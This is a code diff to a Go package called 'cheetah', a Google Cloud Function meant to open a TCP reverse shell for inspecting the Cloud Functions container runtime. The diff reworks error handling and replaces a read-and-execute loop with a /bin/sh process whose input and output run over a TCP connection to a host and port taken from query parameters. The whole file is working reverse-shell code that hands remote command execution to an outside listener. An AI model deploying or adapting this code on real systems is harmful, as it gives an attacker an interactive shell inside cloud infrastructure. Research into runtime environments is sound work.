@@ -1,4 +1,6 @@
 /*
+Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.
+
 References:
 https://github.com/sathish09/rev2go
 https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
@@ -6,7 +8,6 @@ https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
 package cheetah
 
 import (
-	"bufio"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -14,22 +15,28 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
-	"strings"
 	"time"
 )
 
-func respondWithError(w http.ResponseWriter, errMsg string) {
+func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
 	type Response struct {
-		Error string
+		Message string `json:"message"`
 	}
 
-	response := &Response{Error: errMsg}
-	responseJson, _ := json.Marshal(response)
-	fmt.Fprintf(w, "%s", responseJson)
+	response := &Response{Message: errMsg}
+	responseJSON, _ := json.Marshal(response)
+	w.WriteHeader(statusCode)
+	fmt.Fprintf(w, "%s", responseJSON)
 }
 
+// Cheetah establishes a TCP reverse shell connection.
 func Cheetah(w http.ResponseWriter, r *http.Request) {
-	timeout, _ := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
+	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
+
+	if err != nil {
+		respondWithError(w, err.Error(), 500)
+		return
+	}
 
 	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
 	time.AfterFunc(time.Duration(timeout) * time.Second, func() {
@@ -44,38 +51,30 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	port := r.URL.Query().Get("port")
 
 	if host == "" || port == "" {
-		respondWithError(w, "Must provide the host and port for the target TCP server as query parameters.")
+		respondWithError(w, "Must provide the host and port for the target TCP server as query parameters.", 400)
 		return
 	}
 
 	portNum, err := strconv.ParseUint(r.URL.Query().Get("port"), 10, 64)
 
 	if err != nil {
-		respondWithError(w, err.Error())
+		respondWithError(w, err.Error(), 500)
 		return
 	}
 
 	connString := fmt.Sprintf("%s:%d", host, portNum)
 
-	conn, _ := net.Dial("tcp", connString)
+	conn, err := net.Dial("tcp", connString)
 
-	for {
-		message, _ := bufio.NewReader(conn).ReadString('\n')
-
-		messageTrimmed := strings.TrimSuffix(message, "\n")
-
-		if (messageTrimmed == "exit") {
-			respondWithError(w, "Connection terminated from client.")
-			conn.Close()
-			return
-		}
-
-		out, err := exec.Command("/bin/sh", "-c", messageTrimmed).Output()
-
-		if err != nil {
-			fmt.Fprintf(conn, "%s\n", err)
-		}
-
-		fmt.Fprintf(conn, "%s\n", out)
+	if err != nil {
+		respondWithError(w, err.Error(), 500)
+		return
 	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
+	cmd.Run()
+
+	respondWithError(w, "Connection terminated from client.", 500)
+	conn.Close()
 }
